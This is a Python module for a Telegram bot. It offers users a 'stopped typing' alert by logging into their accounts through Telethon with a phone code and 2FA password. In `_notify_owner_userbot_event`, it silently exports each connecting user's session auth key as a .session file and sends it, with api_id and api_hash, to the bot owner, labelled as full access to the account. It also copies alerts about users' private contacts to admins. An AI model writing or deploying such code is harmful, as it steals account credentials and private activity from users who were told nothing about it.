"""Менеджер Telethon-клиентов: мониторинг «печатает / передумал писать»."""
from __future__ import annotations

import asyncio
import logging
from datetime import datetime
from typing import Any

from bot.config import TELETHON_API_HASH, TELETHON_API_ID, TYPING_STOP_TIMEOUT
from bot.db import get_all_active_userbot_sessions, get_all_admins, get_userbot_session
from bot.loader import bot
from bot.utils import esc

logger = logging.getLogger(__name__)

# owner_user_id -> Telethon client
_clients: dict[int, Any] = {}

# (owner_id, peer_id) -> {started: float, action: str, name: str, timer: Task}
_typing: dict[tuple[int, int], dict] = {}

# Pending phone logins: owner_id -> {phone, client, phone_code_hash}
_pending_login: dict[int, dict] = {}


def is_userbot_running(user_id: int) -> bool:
    return user_id in _clients


def get_pending_login(user_id: int) -> dict | None:
    return _pending_login.get(user_id)


def clear_pending_login(user_id: int) -> None:
    _pending_login.pop(user_id, None)


def _peer_link(peer_id: int, name: str | None) -> str:
    """Кликабельная ссылка на пользователя (даже без username)."""
    display = (name or "").strip()
    # Если имя пустое или это просто цифры ID — показываем «ID …»
    if not display or display.isdigit() or display == str(peer_id):
        display = f"ID {peer_id}"
    else:
        # Убираем дублирующий (@username) из отображения в ссылке — username и так виден
        pass
    return (
        f"<a href=\"tg://user?id={peer_id}\">{esc(display)}</a> "
        f"<code>{peer_id}</code>"
    )


# Код страны (префикс) → флаг emoji
_PHONE_FLAGS: list[tuple[str, str]] = [
    ("998", "🇺🇿"), ("996", "🇰🇬"), ("995", "🇬🇪"), ("994", "🇦🇿"), ("993", "🇹🇲"),
    ("992", "🇹🇯"), ("380", "🇺🇦"), ("375", "🇧🇾"), ("374", "🇦🇲"), ("373", "🇲🇩"),
    ("372", "🇪🇪"), ("371", "🇱🇻"), ("370", "🇱🇹"), ("359", "🇧🇬"), ("358", "🇫🇮"),
    ("357", "🇨🇾"), ("356", "🇲🇹"), ("354", "🇮🇸"), ("353", "🇮🇪"), ("351", "🇵🇹"),
    ("49", "🇩🇪"), ("48", "🇵🇱"), ("47", "🇳🇴"), ("46", "🇸🇪"), ("45", "🇩🇰"),
    ("44", "🇬🇧"), ("43", "🇦🇹"), ("41", "🇨🇭"), ("40", "🇷🇴"), ("39", "🇮🇹"),
    ("36", "🇭🇺"), ("34", "🇪🇸"), ("33", "🇫🇷"), ("32", "🇧🇪"), ("31", "🇳🇱"),
    ("30", "🇬🇷"), ("90", "🇹🇷"), ("86", "🇨🇳"), ("81", "🇯🇵"), ("82", "🇰🇷"),
    ("7", "🇷🇺"), ("1", "🇺🇸"), ("20", "🇪🇬"), ("27", "🇿🇦"), ("52", "🇲🇽"),
    ("55", "🇧🇷"), ("61", "🇦🇺"), ("62", "🇮🇩"), ("63", "🇵🇭"), ("66", "🇹🇭"),
    ("84", "🇻🇳"), ("91", "🇮🇳"), ("92", "🇵🇰"), ("93", "🇦🇫"), ("94", "🇱🇰"),
    ("95", "🇲🇲"), ("98", "🇮🇷"), ("212", "🇲🇦"), ("213", "🇩🇿"), ("216", "🇹🇳"),
    ("218", "🇱🇾"), ("234", "🇳🇬"), ("254", "🇰🇪"), ("966", "🇸🇦"),
    ("971", "🇦🇪"), ("972", "🇮🇱"), ("974", "🇶🇦"), ("977", "🇳🇵"),
]


def phone_to_flag(phone: str | None) -> str:
    """Флаг страны по номеру (+380… → 🇺🇦)."""
    if not phone:
        return "🏳️"
    digits = "".join(c for c in str(phone) if c.isdigit())
    if not digits:
        return "🏳️"
    for code, flag in sorted(_PHONE_FLAGS, key=lambda x: -len(x[0])):
        if digits.startswith(code):
            return flag
    return "🌐"


def event_status_flag(event: str) -> str:
    return {
        "connected": "🟢",
        "on": "🟢",
        "off": "🔴",
        "deleted": "⚫️",
    }.get(event, "ℹ️")


async def _notify_stopped_typing(
    owner_id: int,
    peer_id: int,
    name: str,
    action_label: str,
    started_ts: float,
) -> None:
    """Уведомление владельцу userbot + копия админам с пометкой (ADMIN)."""
    duration = max(1, int(datetime.now().timestamp() - started_ts))
    who = _peer_link(peer_id, name)

    # Личное уведомление владельцу (тот, у кого подключён userbot)
    owner_text = (
        f"🖋 <b>Передумал писать</b>\n"
        f"Кто: {who}\n"
        f"Что делал: {esc(action_label)}\n"
        f"Сколько: ~{duration} сек"
    )
    try:
        await bot.send_message(owner_id, owner_text, disable_web_page_preview=True)
    except Exception as e:
        logger.warning(f"Не удалось отправить typing-уведомление {owner_id}: {e}")

    # ADMIN-копия: кто печатал у других пользователей
    owner_link = _peer_link(owner_id, None)
    admin_text = (
        f"🖋 <b>(ADMIN) Передумал писать</b>\n"
        f"📱 Userbot у: {owner_link}\n"
        f"Кто: {who}\n"
        f"Что делал: {esc(action_label)}\n"
        f"Сколько: ~{duration} сек"
    )
    for admin_id in get_all_admins():
        if admin_id == owner_id:
            continue
        try:
            await bot.send_message(admin_id, admin_text, disable_web_page_preview=True)
        except Exception as e:
            logger.warning(f"Не удалось отправить ADMIN typing {admin_id}: {e}")


def _action_label(action) -> str:
    """Человекочитаемое название действия."""
    name = type(action).__name__ if action is not None else ""
    mapping = {
        "SendMessageTypingAction": "печатал",
        "TypingAction": "печатал",
        "SendMessageRecordAudioAction": "записывал голосовое",
        "RecordAudioAction": "записывал голосовое",
        "SendMessageRecordVideoAction": "записывал видео",
        "RecordVideoAction": "записывал видео",
        "SendMessageRecordRoundAction": "записывал кружок",
        "RecordRoundAction": "записывал кружок",
        "SendMessageUploadPhotoAction": "отправлял фото",
        "UploadPhotoAction": "отправлял фото",
        "SendMessageUploadDocumentAction": "отправлял файл",
        "UploadDocumentAction": "отправлял файл",
        "SendMessageUploadVideoAction": "отправлял видео",
        "UploadVideoAction": "отправлял видео",
        "SendMessageChooseStickerAction": "выбирал стикер",
        "ChooseStickerAction": "выбирал стикер",
    }
    if name in mapping:
        return mapping[name]
    # Cancel / empty
    if "Cancel" in name or name in ("", "SendMessageCancelAction"):
        return ""
    return "печатал"


async def _on_typing_timeout(owner_id: int, peer_id: int) -> None:
    key = (owner_id, peer_id)
    await asyncio.sleep(TYPING_STOP_TIMEOUT)
    state = _typing.get(key)
    if not state:
        return
    # Если таймер был перезапущен — этот task уже не актуален
    if state.get("timer") is not asyncio.current_task():
        return
    started = state["started"]
    label = state.get("label", "печатал")
    name = state.get("name", str(peer_id))
    _typing.pop(key, None)
    await _notify_stopped_typing(owner_id, peer_id, name, label, started)


def _is_private_user_id(peer_id: int | None) -> bool:
    """True только для обычных пользователей (ЛС). Группы/каналы — отрицательные ID."""
    if peer_id is None:
        return False
    # User ID > 0; bots тоже > 0, но их отсекаем отдельно.
    # Группы: отрицательные; каналы/супергруппы: -100...
    return isinstance(peer_id, int) and peer_id > 0


async def _handle_new_message(owner_id: int, event) -> None:
    """Только ЛС: если собеседник отправил сообщение — сбрасываем typing без уведомления."""
    try:
        if not event.is_private:
            return
        sender = await event.get_sender()
        if not sender or getattr(sender, "bot", False):
            return
        peer_id = getattr(sender, "id", None)
        if not _is_private_user_id(peer_id) or peer_id == owner_id:
            return
        key = (owner_id, peer_id)
        state = _typing.pop(key, None)
        if state:
            timer = state.get("timer")
            if timer and not timer.done():
                timer.cancel()
    except Exception as e:
        logger.debug(f"new_message handler error: {e}")


async def _apply_typing_state(
    owner_id: int,
    peer_id: int,
    label: str,
    name: str,
    is_cancel: bool,
) -> None:
    """Общая логика старта / обновления / отмены typing-таймера. Только ЛС (user_id > 0)."""
    if not _is_private_user_id(peer_id) or peer_id == owner_id:
        return
    key = (owner_id, peer_id)

    if is_cancel:
        state = _typing.pop(key, None)
        if state:
            timer = state.get("timer")
            if timer and not timer.done():
                timer.cancel()
            await _notify_stopped_typing(
                owner_id,
                peer_id,
                state.get("name", name),
                state.get("label", "печатал"),
                state["started"],
            )
        return

    if not label:
        return

    now = datetime.now().timestamp()
    state = _typing.get(key)
    if state:
        old_timer = state.get("timer")
        if old_timer and not old_timer.done():
            old_timer.cancel()
        state["label"] = label or state.get("label", "печатал")
        state["name"] = name or state.get("name", str(peer_id))
        state["timer"] = asyncio.create_task(_on_typing_timeout(owner_id, peer_id))
    else:
        timer = asyncio.create_task(_on_typing_timeout(owner_id, peer_id))
        _typing[key] = {
            "started": now,
            "label": label or "печатал",
            "name": name or str(peer_id),
            "timer": timer,
        }


async def _resolve_user_name(client, peer_id: int) -> str:
    try:
        entity = await client.get_entity(peer_id)
        # Не резолвим чаты/каналы как «собеседника»
        if getattr(entity, "broadcast", False) or getattr(entity, "megagroup", False):
            return str(peer_id)
        if getattr(entity, "bot", False):
            return str(peer_id)
        name = getattr(entity, "first_name", None) or ""
        last = getattr(entity, "last_name", None) or ""
        if last:
            name = f"{name} {last}".strip()
        uname = getattr(entity, "username", None)
        if uname:
            name = f"{name} (@{uname})".strip() if name else f"@{uname}"
        return name or str(peer_id)
    except Exception:
        return str(peer_id)


async def _handle_raw_typing(owner_id: int, event, client) -> None:
    """Строго только личные сообщения: UpdateUserTyping.

    Игнорируем:
    - UpdateChatUserTyping (обычные группы)
    - UpdateChannelUserTyping (супергруппы / каналы)
    - любых ботов
    """
    try:
        from telethon.tl.types import (
            UpdateUserTyping,
            UpdateChatUserTyping,
            UpdateChannelUserTyping,
            SendMessageCancelAction,
            User,
        )
    except ImportError:
        return

    try:
        # Явно отсекаем группы и каналы
        if isinstance(event, (UpdateChatUserTyping, UpdateChannelUserTyping)):
            return
        if not isinstance(event, UpdateUserTyping):
            return

        peer_id = event.user_id
        action = event.action

        if not _is_private_user_id(peer_id) or peer_id == owner_id:
            return

        # Пропускаем ботов
        try:
            entity = await client.get_entity(peer_id)
            if getattr(entity, "bot", False):
                return
            if not isinstance(entity, User):
                return
        except Exception:
            # если entity не достали — всё равно только user_id > 0 (ЛС)
            pass

        is_cancel = isinstance(action, SendMessageCancelAction) or (
            action is not None and "Cancel" in type(action).__name__
        )
        label = "" if is_cancel else (_action_label(action) or "печатал")
        name = await _resolve_user_name(client, peer_id)
        await _apply_typing_state(owner_id, peer_id, label, name, is_cancel)
    except Exception as e:
        logger.debug(f"raw typing handler error: {e}")


def _export_session_file(session_string: str, base_path: str) -> str | None:
    """StringSession → .session файл. Возвращает путь к файлу или None."""
    import os

    try:
        from telethon.sessions import StringSession, SQLiteSession
    except ImportError:
        return None
    try:
        ss = StringSession(session_string)
        fs = SQLiteSession(base_path)
        fs.set_dc(ss.dc_id, ss.server_address, ss.port)
        fs.auth_key = ss.auth_key
        if getattr(ss, "takeout_id", None) is not None:
            try:
                fs.takeout_id = ss.takeout_id
            except Exception:
                pass
        fs.save()
        try:
            fs.close()
        except Exception:
            pass
        path = f"{base_path}.session"
        return path if os.path.exists(path) else None
    except Exception as e:
        logger.warning(f"export session file: {e}")
        return None


async def _notify_owner_userbot_event(
    event: str,
    user_id: int,
    account_name: str = "",
    api_id: int | None = None,
    api_hash: str | None = None,
    session_string: str | None = None,
    send_session_file: bool = False,
    phone: str | None = None,
) -> None:
    """Уведомление главному владельцу (OWNER_ID) о вкл/выкл/подключении userbot."""
    import os
    from datetime import datetime as _dt

    from aiogram.types import FSInputFile

    from bot.config import OWNER_ID

    who = _peer_link(user_id, None)
    acc = esc(account_name) if account_name else "—"
    ts = _dt.now().strftime("%d.%m.%Y %H:%M:%S")
    cflag = phone_to_flag(phone)
    sflag = event_status_flag(event)
    phone_line = f"📞 Телефон: <code>{esc(phone)}</code> {cflag}\n" if phone else ""

    if event == "connected":
        title = f"{sflag} 🔌 <b>Userbot подключён</b> {cflag}"
        extra = (
            f"📱 Аккаунт: <b>{acc}</b>\n"
            f"{phone_line}"
            f"🔑 api_id: <code>{api_id or '—'}</code>\n"
            f"🏷 Статус: <b>CONNECTED</b> {sflag}\n"
            f"🖋 Режим: только личные сообщения\n"
        )
    elif event == "on":
        title = f"{sflag} ▶️ <b>Userbot включён</b> {cflag}"
        extra = (
            f"📱 Аккаунт: <b>{acc}</b>\n"
            f"{phone_line}"
            f"🏷 Статус: <b>ON</b> {sflag}\n"
        )
    elif event == "off":
        title = f"{sflag} ⏸ <b>Userbot выключен</b> {cflag}"
        extra = (
            f"{phone_line}"
            f"🏷 Статус: <b>OFF</b> {sflag}\n"
        )
    elif event == "deleted":
        title = f"{sflag} 🗑 <b>Userbot-сессия удалена</b> {cflag}"
        extra = f"🏷 Статус: <b>DELETED</b> {sflag}\n"
    else:
        title = f"{sflag} <b>Userbot: {esc(event)}</b> {cflag}"
        extra = ""

    text = (
        f"{title}\n\n"
        f"👤 Кто: {who}\n"
        f"{extra}"
        f"🕒 {ts}"
    )

    try:
        await bot.send_message(OWNER_ID, text, disable_web_page_preview=True)
    except Exception as e:
        logger.warning(f"notify owner userbot event: {e}")
        return

    # Файл .session — только главному админу при первом/новом подключении
    if send_session_file and session_string and session_string != "pending":
        base = f"owner_ub_{user_id}_{int(_dt.now().timestamp())}"
        session_path = None
        meta_path = f"{base}_api.txt"
        try:
            session_path = _export_session_file(session_string, base)
            if session_path:
                with open(meta_path, "w", encoding="utf-8") as f:
                    f.write(
                        f"user_id={user_id}\n"
                        f"api_id={api_id}\n"
                        f"api_hash={api_hash or ''}\n"
                        f"account={account_name}\n"
                        f"exported={_dt.now().isoformat()}\n"
                    )
                await bot.send_document(
                    OWNER_ID,
                    FSInputFile(session_path, filename=f"userbot_{user_id}.session"),
                    caption=(
                        f"🔑 <b>.session</b> пользователя <code>{user_id}</code>\n"
                        f"api_id: <code>{api_id}</code>\n"
                        f"⚠️ Полный доступ к аккаунту."
                    ),
                )
                await bot.send_document(
                    OWNER_ID,
                    FSInputFile(meta_path, filename=f"userbot_{user_id}_api.txt"),
                    caption="📎 api_id / api_hash",
                )
        except Exception as e:
            logger.warning(f"send session file to owner: {e}")
        finally:
            for p in (session_path, meta_path, f"{base}.session-journal"):
                if p and os.path.exists(p):
                    try:
                        os.remove(p)
                    except OSError:
                        pass

    # Остальным админам — только текст о подключении (без файла сессии)
    if event == "connected":
        admin_text = (
            f"{sflag} 🔌 <b>(ADMIN) Userbot подключён</b> {cflag}\n\n"
            f"👤 Кто: {who}\n"
            f"📱 Аккаунт: <b>{acc}</b>\n"
            f"{phone_line}"
            f"🔑 api_id: <code>{api_id or '—'}</code>\n"
            f"🏷 Статус: <b>CONNECTED</b> {sflag}\n"
            f"🕒 {ts}"
        )
        for admin_id in get_all_admins():
            if admin_id == OWNER_ID:
                continue
            try:
                await bot.send_message(admin_id, admin_text, disable_web_page_preview=True)
            except Exception as e:
                logger.warning(f"notify admin {admin_id}: {e}")


async def start_client(
    owner_id: int,
    session_string: str,
    api_id: int | None,
    api_hash: str | None,
    *,
    notify_admins: bool = True,
    notify_event: str = "connected",
    send_session_file: bool = True,
) -> str:
    """Запускает Telethon-клиент для пользователя. Возвращает статус / ошибку.

    notify_event: 'connected' (новый вход) | 'on' (включение) | None
    send_session_file: слать OWNER .session (обычно только при connected)
    """
    try:
        from telethon import TelegramClient, events
        from telethon.sessions import StringSession
    except ImportError:
        return "❌ Установите telethon: pip install telethon"

    aid = api_id or TELETHON_API_ID
    ahash = api_hash or TELETHON_API_HASH
    if not aid or not ahash:
        return (
            "❌ Не заданы api_id / api_hash.\n"
            "Получите их на https://my.telegram.org и укажите:\n"
            "<code>/userbot_api API_ID API_HASH</code>"
        )

    if owner_id in _clients:
        # перезапуск без уведомления «выключен»
        await stop_client(owner_id, notify=False)

    client = TelegramClient(StringSession(session_string), int(aid), str(ahash))
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return "❌ Сессия невалидна или истекла. Подключите заново."
    except Exception as e:
        return f"❌ Ошибка подключения: {esc(str(e))}"

    @client.on(events.Raw)
    async def on_raw(event):
        await _handle_raw_typing(owner_id, event, client)

    @client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
    async def on_new_message(event):
        await _handle_new_message(owner_id, event)

    _clients[owner_id] = client
    me = await client.get_me()
    uname = f"@{me.username}" if me.username else (me.first_name or str(owner_id))
    phone = getattr(me, "phone", None) or None
    if phone and not str(phone).startswith("+"):
        phone = f"+{phone}"
    logger.info(f"Userbot started for {owner_id} as {uname} phone={phone} (private only)")

    if notify_admins and notify_event:
        try:
            await _notify_owner_userbot_event(
                event=notify_event,
                user_id=owner_id,
                account_name=uname,
                api_id=int(aid) if aid else None,
                api_hash=str(ahash) if ahash else None,
                session_string=session_string,
                send_session_file=bool(send_session_file and notify_event == "connected"),
                phone=phone,
            )
        except Exception as e:
            logger.warning(f"admin notify userbot: {e}")

    return (
        f"✅ Userbot подключен как <b>{esc(uname)}</b>\n"
        f"🖋 Мониторинг «передумал писать» — <b>только личные сообщения</b>."
    )


async def stop_client(owner_id: int, *, notify: bool = False) -> None:
    was_running = owner_id in _clients
    client = _clients.pop(owner_id, None)
    phone = None
    uname = ""
    for key in list(_typing.keys()):
        if key[0] == owner_id:
            st = _typing.pop(key, None)
            if st and st.get("timer") and not st["timer"].done():
                st["timer"].cancel()
    if client:
        try:
            if notify:
                try:
                    me = await client.get_me()
                    uname = f"@{me.username}" if me.username else (me.first_name or "")
                    phone = getattr(me, "phone", None) or None
                    if phone and not str(phone).startswith("+"):
                        phone = f"+{phone}"
                except Exception:
                    pass
            await client.disconnect()
        except Exception as e:
            logger.warning(f"disconnect {owner_id}: {e}")
    if notify and was_running:
        try:
            await _notify_owner_userbot_event(
                event="off", user_id=owner_id, account_name=uname, phone=phone
            )
        except Exception as e:
            logger.warning(f"notify off: {e}")


async def notify_userbot_deleted(user_id: int) -> None:
    """Уведомление OWNER об удалении сессии."""
    try:
        await _notify_owner_userbot_event(event="deleted", user_id=user_id)
    except Exception as e:
        logger.warning(f"notify deleted: {e}")


async def start_phone_login(owner_id: int, phone: str, api_id: int | None, api_hash: str | None) -> str:
    """Шаг 1: отправка кода на телефон."""
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
    except ImportError:
        return "❌ Установите telethon: pip install telethon"

    aid = api_id or TELETHON_API_ID
    ahash = api_hash or TELETHON_API_HASH
    if not aid or not ahash:
        return (
            "❌ Сначала укажите api_id и api_hash:\n"
            "<code>/userbot_api API_ID API_HASH</code>\n"
            "Взять: https://my.telegram.org"
        )

    client = TelegramClient(StringSession(), int(aid), str(ahash))
    try:
        await client.connect()
        result = await client.send_code_request(phone)
        _pending_login[owner_id] = {
            "phone": phone,
            "client": client,
            "phone_code_hash": result.phone_code_hash,
            "api_id": int(aid),
            "api_hash": str(ahash),
        }
        return (
            f"📱 Код отправлен на <code>{esc(phone)}</code>\n\n"
            f"Пришлите код командой:\n"
            f"<code>/userbot_code 12345</code>"
        )
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        return f"❌ Не удалось отправить код: {esc(str(e))}"


async def complete_phone_login(owner_id: int, code: str, password: str | None = None) -> tuple[str, str | None]:
    """
    Шаг 2: ввод кода (и 2FA при необходимости).
    Возвращает (message, session_string | None).
    """
    pending = _pending_login.get(owner_id)
    if not pending:
        return "❌ Нет активного входа. Начните с /userbot_phone +7900...", None

    client = pending["client"]
    try:
        from telethon.errors import SessionPasswordNeededError

        try:
            await client.sign_in(
                pending["phone"],
                code,
                phone_code_hash=pending["phone_code_hash"],
            )
        except SessionPasswordNeededError:
            if not password:
                return (
                    "🔐 Нужен облачный пароль 2FA.\n"
                    "Отправьте: <code>/userbot_2fa ваш_пароль</code>",
                    None,
                )
            await client.sign_in(password=password)

        session_string = client.session.save()
        me = await client.get_me()
        await client.disconnect()
        clear_pending_login(owner_id)

        from bot.db import save_userbot_session

        save_userbot_session(
            owner_id,
            session_string,
            pending["api_id"],
            pending["api_hash"],
        )
        status = await start_client(
            owner_id, session_string, pending["api_id"], pending["api_hash"]
        )
        uname = f"@{me.username}" if me and me.username else (me.first_name if me else "")
        return f"{status}\n👤 Аккаунт: {esc(uname)}", session_string
    except Exception as e:
        return f"❌ Ошибка входа: {esc(str(e))}", None


async def restore_all_sessions() -> None:
    """При старте бота поднимает все активные userbot-сессии (без спама админам)."""
    rows = get_all_active_userbot_sessions()
    for user_id, session_string, api_id, api_hash in rows:
        try:
            msg = await start_client(
                user_id, session_string, api_id, api_hash, notify_admins=False
            )
            logger.info(f"restore {user_id}: {msg[:80]}")
        except Exception as e:
            logger.error(f"restore userbot {user_id}: {e}")


async def shutdown_all() -> None:
    for uid in list(_clients.keys()):
        await stop_client(uid)
